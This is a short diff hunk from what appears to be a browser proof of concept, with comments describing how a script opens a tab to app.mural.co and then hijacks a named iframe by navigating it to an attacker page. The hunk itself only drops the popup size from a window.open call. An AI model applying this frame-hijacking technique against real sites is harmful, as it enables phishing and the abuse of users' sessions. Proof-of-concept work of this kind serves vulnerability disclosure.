@@ -13,7 +13,7 @@
         // Method 1: Open a new tab, then hijack the iframe by targeting its name
         function openNewTab() {
             // 1. Open victim.html (which contains <iframe name="myframe">)
-            window.open("https://app.mural.co/", "_blank", "width=500,height=500");
+            window.open("https://app.mural.co/", "_blank");
 
             // 2. Hijack the iframe by targeting its name — navigates it to victim.html
             setTimeout(function() {
